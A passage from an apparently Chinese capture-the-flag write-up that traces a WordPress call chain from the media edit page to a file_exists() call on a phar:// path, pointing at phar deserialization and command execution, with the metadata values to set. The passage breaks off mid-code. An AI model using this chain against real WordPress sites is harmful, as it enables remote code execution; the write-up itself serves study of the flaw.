<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/media.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Scale an image to fit a particular size (such as &#x27;thumb&#x27; or &#x27;medium&#x27;).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The URL might be the original image, or it might be a resized version. This</span></span><br><span class="line"><span class="comment"> * function won&#x27;t create a new resized copy, it will just return an already</span></span><br><span class="line"><span class="comment"> * resized one if it exists.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A plugin may use the &#123;<span class="doctag">@see</span> &#x27;image_downsize&#x27;&#125; filter to hook into and offer image</span></span><br><span class="line"><span class="comment"> * resizing services for images. The hook must return an array with the same</span></span><br><span class="line"><span class="comment"> * elements that are normally returned from the function.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.5.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int          $id   Attachment ID for image.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string|int[] $size Optional. Image size to scale to. Accepts any valid image size name,</span></span><br><span class="line"><span class="comment"> *                           or an array of width and height values in pixels (in that order).</span></span><br><span class="line"><span class="comment"> *                           Default &#x27;medium&#x27;.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array|false &#123;</span></span><br><span class="line"><span class="comment"> *     Array of image data, or boolean false if no image is available.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> string $0 Image source URL.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> int    $1 Image width in pixels.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> int    $2 Image height in pixels.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> bool   $3 Whether the image is a resized image.</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">image_downsize</span>(<span class="params"> $id, $size = <span class="string">&#x27;medium&#x27;</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> ( $intermediate ) &#123;</span><br><span class="line">		$img_url         = str_replace( $img_url_basename, $intermediate[<span class="string">&#x27;file&#x27;</span>], $img_url );</span><br><span class="line">		$width           = $intermediate[<span class="string">&#x27;width&#x27;</span>];</span><br><span class="line">		$height          = $intermediate[<span class="string">&#x27;height&#x27;</span>];</span><br><span class="line">		$is_intermediate = <span class="literal">true</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span> ( <span class="string">&#x27;thumbnail&#x27;</span> === $size ) &#123;</span><br><span class="line">		<span class="comment">// Fall back to the old thumbnail.</span></span><br><span class="line">		$thumb_file = wp_get_attachment_thumb_file( $id );</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>image_downsize函数的作用就是将一个附件转换为不同尺寸的缩略图，如果size是thumbnail的话就可以直接调用wp_get_attachment_thumb_file，那么再看有没有什么地方调用了image_downsize函数，并且size是thumbnail。由于WordPress的媒体页面中可以很明显看到提供了多种尺寸的附件缩略图，所以肯定可以找到满足要求的调用点。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/includes/media.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieve HTML for the size radio buttons with the specified one checked.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.7.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> WP_Post     $post</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool|string $check</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">image_size_input_fields</span>(<span class="params"> $post, $check = <span class="string">&#x27;&#x27;</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $size_names = apply_filters(</span><br><span class="line">		<span class="string">&#x27;image_size_names_choose&#x27;</span>,</span><br><span class="line">		<span class="keyword">array</span>(</span><br><span class="line">			<span class="string">&#x27;thumbnail&#x27;</span> =&gt; __( <span class="string">&#x27;Thumbnail&#x27;</span> ),</span><br><span class="line">			<span class="string">&#x27;medium&#x27;</span>    =&gt; __( <span class="string">&#x27;Medium&#x27;</span> ),</span><br><span class="line">			<span class="string">&#x27;large&#x27;</span>     =&gt; __( <span class="string">&#x27;Large&#x27;</span> ),</span><br><span class="line">			<span class="string">&#x27;full&#x27;</span>      =&gt; __( <span class="string">&#x27;Full Size&#x27;</span> ),</span><br><span class="line">		)</span><br><span class="line">	);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">foreach</span> ( $size_names <span class="keyword">as</span> $size =&gt; $label ) &#123;</span><br><span class="line">		$downsize = image_downsize( $post-&gt;ID, $size );</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $html = <span class="string">&quot;&lt;div class=&#x27;image-size-item&#x27;&gt;&lt;input type=&#x27;radio&#x27; &quot;</span> . disabled( $enabled, <span class="literal">false</span>, <span class="literal">false</span> ) . <span class="string">&quot;name=&#x27;attachments[<span class="subst">$post</span>-&gt;ID][image-size]&#x27; id=&#x27;<span class="subst">&#123;$css_id&#125;</span>&#x27; value=&#x27;<span class="subst">&#123;$size&#125;</span>&#x27;<span class="subst">$checked</span> /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">		$html .= <span class="string">&quot;&lt;label for=&#x27;<span class="subst">&#123;$css_id&#125;</span>&#x27;&gt;<span class="subst">$label</span>&lt;/label&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;label&#x27;</span> =&gt; __( <span class="string">&#x27;Size&#x27;</span> ),</span><br><span class="line">		<span class="string">&#x27;input&#x27;</span> =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;html&#x27;</span>  =&gt; join( <span class="string">&quot;\n&quot;</span>, $out ),</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可以看到在foreach中对每一个size进行遍历，而size_names中刚好有thumbnail，可以成功触发image_downsize。通过分析函数，可以看到该函数的作用是构造HTML表单，那么很幸运，即然这个函数要输出HTML，可以通过接口调用该函数的可能性就更大了，再找一找哪里可以触发该函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/includes/media.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieves the attachment fields to edit form fields.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.5.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> WP_Post $post</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array   $errors</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_attachment_fields_to_edit</span>(<span class="params"> $post, $errors = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// This was formerly in image_attachment_fields_to_edit().</span></span><br><span class="line">	<span class="keyword">if</span> ( <span class="string">&#x27;image&#x27;</span> === substr( $post-&gt;post_mime_type, <span class="number">0</span>, <span class="number">5</span> ) ) &#123;</span><br><span class="line">		$alt = get_post_meta( $post-&gt;ID, <span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( <span class="keyword">empty</span>( $alt ) ) &#123;</span><br><span class="line">			$alt = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$form_fields[<span class="string">&#x27;post_title&#x27;</span>][<span class="string">&#x27;required&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">		$form_fields[<span class="string">&#x27;image_alt&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">			<span class="string">&#x27;value&#x27;</span> =&gt; $alt,</span><br><span class="line">			<span class="string">&#x27;label&#x27;</span> =&gt; __( <span class="string">&#x27;Alternative Text&#x27;</span> ),</span><br><span class="line">			<span class="string">&#x27;helps&#x27;</span> =&gt; __( <span class="string">&#x27;Alt text for the image, e.g. &amp;#8220;The Mona Lisa&amp;#8221;&#x27;</span> ),</span><br><span class="line">		);</span><br><span class="line"></span><br><span class="line">		$form_fields[<span class="string">&#x27;align&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">			<span class="string">&#x27;label&#x27;</span> =&gt; __( <span class="string">&#x27;Alignment&#x27;</span> ),</span><br><span class="line">			<span class="string">&#x27;input&#x27;</span> =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;html&#x27;</span>  =&gt; image_align_input_fields( $post, get_option( <span class="string">&#x27;image_default_align&#x27;</span> ) ),</span><br><span class="line">		);</span><br><span class="line"></span><br><span class="line">		$form_fields[<span class="string">&#x27;image-size&#x27;</span>] = image_size_input_fields( $post, get_option( <span class="string">&#x27;image_default_size&#x27;</span>, <span class="string">&#x27;medium&#x27;</span> ) );</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">unset</span>( $form_fields[<span class="string">&#x27;image_alt&#x27;</span>] );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">    	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Filters the attachment fields to edit.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@since</span> 2.5.0</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> array   $form_fields An array of attachment form fields.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> WP_Post $post        The WP_Post attachment object.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	$form_fields = apply_filters( <span class="string">&#x27;attachment_fields_to_edit&#x27;</span>, $form_fields, $post );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $form_fields;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可以看到第35行<code>$form_fields[&#39;image-size&#39;] = image_size_input_fields( $post, get_option( &#39;image_default_size&#39;, &#39;medium&#39; ) );</code>调用了该函数，而进入该if分支的条件是<code>&#39;image&#39; === substr( $post-&gt;post_mime_type, 0, 5 )</code>，只要我们上传的文件mime是image就可以进入分支，那么再找找哪里调用了get_attachment_fields_to_edit。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/includes/media.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieve HTML form for modifying the image attachment.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.5.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@global</span> string $redir_tab</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int          $attachment_id Attachment ID for modification.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string|array $args          Optional. Override defaults.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string HTML form for attachment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_media_item</span>(<span class="params"> $attachment_id, $args = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">	$post_mime_types = get_post_mime_types();</span><br><span class="line">	$keys            = array_keys( wp_match_mime_types( array_keys( $post_mime_types ), $post-&gt;post_mime_type ) );</span><br><span class="line">	$type            = reset( $keys );</span><br><span class="line">	$type_html       = <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; id=&#x27;type-of-<span class="subst">$attachment_id</span>&#x27; value=&#x27;&quot;</span> . esc_attr( $type ) . <span class="string">&quot;&#x27; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	$form_fields = get_attachment_fields_to_edit( $post, $parsed_args[<span class="string">&#x27;errors&#x27;</span>] );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( $parsed_args[<span class="string">&#x27;toggle&#x27;</span>] ) &#123;</span><br><span class="line">		$class        = <span class="keyword">empty</span>( $parsed_args[<span class="string">&#x27;errors&#x27;</span>] ) ? <span class="string">&#x27;startclosed&#x27;</span> : <span class="string">&#x27;startopen&#x27;</span>;</span><br><span class="line">		$toggle_links = <span class="string">&quot;</span></span><br><span class="line"><span class="string">		&lt;a class=&#x27;toggle describe-toggle-on&#x27; href=&#x27;#&#x27;&gt;<span class="subst">$toggle_on</span>&lt;/a&gt;</span></span><br><span class="line"><span class="string">		&lt;a class=&#x27;toggle describe-toggle-off&#x27; href=&#x27;#&#x27;&gt;<span class="subst">$toggle_off</span>&lt;/a&gt;&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$class        = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		$toggle_links = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $item .= <span class="string">&quot;\t&lt;/tbody&gt;\n&quot;</span>;</span><br><span class="line">	$item .= <span class="string">&quot;\t&lt;/table&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span> ( $hidden_fields <span class="keyword">as</span> $name =&gt; $value ) &#123;</span><br><span class="line">		$item .= <span class="string">&quot;\t&lt;input type=&#x27;hidden&#x27; name=&#x27;<span class="subst">$name</span>&#x27; id=&#x27;<span class="subst">$name</span>&#x27; value=&#x27;&quot;</span> . esc_attr( $value ) . <span class="string">&quot;&#x27; /&gt;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( $post-&gt;post_parent &lt; <span class="number">1</span> &amp;&amp; <span class="keyword">isset</span>( $_REQUEST[<span class="string">&#x27;post_id&#x27;</span>] ) ) &#123;</span><br><span class="line">		$parent      = (<span class="keyword">int</span>) $_REQUEST[<span class="string">&#x27;post_id&#x27;</span>];</span><br><span class="line">		$parent_name = <span class="string">&quot;attachments[<span class="subst">$attachment_id</span>][post_parent]&quot;</span>;</span><br><span class="line">		$item       .= <span class="string">&quot;\t&lt;input type=&#x27;hidden&#x27; name=&#x27;<span class="subst">$parent_name</span>&#x27; id=&#x27;<span class="subst">$parent_name</span>&#x27; value=&#x27;<span class="subst">$parent</span>&#x27; /&gt;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这是一个非常大的函数，该函数的作用就是构造HTML输出页面，其中刚好包含了构造表单的函数。那么再看哪里可以触发get_media_item。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/media.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Media management action handler.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> WordPress</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@subpackage</span> Administration</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Load WordPress Administration Bootstrap */</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/admin.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$parent_file  = <span class="string">&#x27;upload.php&#x27;</span>;</span><br><span class="line">$submenu_file = <span class="string">&#x27;upload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">wp_reset_vars( <span class="keyword">array</span>( <span class="string">&#x27;action&#x27;</span> ) );</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ( $action ) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// No break.</span></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;edit&#x27;</span>:</span><br><span class="line">		$title = __( <span class="string">&#x27;Edit Media&#x27;</span> );</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( <span class="keyword">empty</span>( $errors ) ) &#123;</span><br><span class="line">			$errors = <span class="literal">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( <span class="keyword">empty</span>( $_GET[<span class="string">&#x27;attachment_id&#x27;</span>] ) ) &#123;</span><br><span class="line">			wp_redirect( admin_url( <span class="string">&#x27;upload.php&#x27;</span> ) );</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$att_id = (<span class="keyword">int</span>) $_GET[<span class="string">&#x27;attachment_id&#x27;</span>];</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        &lt;form method=&quot;post&quot; class=&quot;media-upload-form&quot; id=&quot;media-single-form&quot;&gt;</span><br><span class="line">	&lt;p class=&quot;submit&quot; style=&quot;padding-bottom: 0;&quot;&gt;</span><br><span class="line">		<span class="meta">&lt;?php</span> submit_button( __( <span class="string">&#x27;Update Media&#x27;</span> ), <span class="string">&#x27;primary&#x27;</span>, <span class="string">&#x27;save&#x27;</span>, <span class="literal">false</span> ); <span class="meta">?&gt;</span></span><br><span class="line">	&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">	&lt;div class=&quot;media-single&quot;&gt;</span><br><span class="line">	&lt;div id=&quot;media-item-&lt;?php echo $att_id; ?&gt;&quot; class=&quot;media-item&quot;&gt;</span><br><span class="line">		<span class="meta">&lt;?php</span></span><br><span class="line">		<span class="keyword">echo</span> get_media_item(</span><br><span class="line">			$att_id,</span><br><span class="line">			<span class="keyword">array</span>(</span><br><span class="line">				<span class="string">&#x27;toggle&#x27;</span>     =&gt; <span class="literal">false</span>,</span><br><span class="line">				<span class="string">&#x27;send&#x27;</span>       =&gt; <span class="literal">false</span>,</span><br><span class="line">				<span class="string">&#x27;delete&#x27;</span>     =&gt; <span class="literal">false</span>,</span><br><span class="line">				<span class="string">&#x27;show_title&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">				<span class="string">&#x27;errors&#x27;</span>     =&gt; ! <span class="keyword">empty</span>( $errors[ $att_id ] ) ? $errors[ $att_id ] : <span class="literal">null</span>,</span><br><span class="line">			)</span><br><span class="line">		);</span><br><span class="line">		<span class="meta">?&gt;</span></span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">     <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>到了这里，已经进入了一个前端页面中，代表我们可以直接访问了，访问地址为”/wp-admin/media.php”。可以看到在一个前端输出中调用了get_media_item，该输出位于一个case中，条件为action参数是edit，并且需要一个合法的attachment_id参数，如下图所示。需要注意的是该利用链中的所有的id（包括attachment_id或者post_id等等）均指上传的附件id。</p>
<p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/1.png"></p>
<p>测试一下该利用链是否可以跳转到file_exists函数，手动patch一下源码，加了一个die，之所以加在if的前面是因为还没有设置imagedata。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">$imagedata = wp_get_attachment_metadata( $post-&gt;ID );</span><br><span class="line"><span class="keyword">if</span> ( ! is_array( $imagedata ) ) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = get_attached_file( $post-&gt;ID );</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $imagedata[<span class="string">&#x27;thumb&#x27;</span>] ) ) &#123;</span><br><span class="line">    $thumbfile = str_replace( basename( $file ), $imagedata[<span class="string">&#x27;thumb&#x27;</span>], $file );</span><br><span class="line">    <span class="keyword">if</span> ( file_exists( $thumbfile ) ) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>



<p>可以成功触发。</p>
<p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/2.png"></p>
<p>最终的漏洞利用链如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">switch case &#39;edit&#39; [wp-admin&#x2F;media.php:47] -&gt;</span><br><span class="line">get_media_item [wp-admin&#x2F;media.php:142] -&gt;</span><br><span class="line">get_attachment_fields_to_edit [wp-admin&#x2F;includes&#x2F;media.php:1596] -&gt;</span><br><span class="line">image_size_input_fields [wp-admin&#x2F;includes&#x2F;media.php:1459] -&gt;</span><br><span class="line">image_downsize [wp-admin&#x2F;includes&#x2F;media.php:1156] -&gt;</span><br><span class="line">wp_get_attachment_thumb_file [wp-includes&#x2F;media.php:244] -&gt;</span><br><span class="line">file_exists(&quot;phar:&#x2F;&#x2F;.....&quot;) [wp-includes&#x2F;post.php:6148] -&gt;</span><br><span class="line">execute command</span><br></pre></td></tr></table></figure>



<p>接下来就需要控制_wp_attachment_metadata与_wp_attached_file字段的值，其中_wp_attachment_metadata字段就是imagedata的值，_wp_attached_file就是file的值，控制file为<code>Z:\Z</code>之后就要控制imagedata[‘thumb’]的值为<code>phar://../wp-content/uploads/2020/12/a.gif/test.txt</code>，a.gif就是上传的附件。</p>
<p>在以前的WordPress中可以通过meta_input参数就可以直接控制数据库中各表的数据，但是之后WordPress补了这个洞，Patch如下。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns only allowed post data fields</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 5.0.1</span></span><br><span 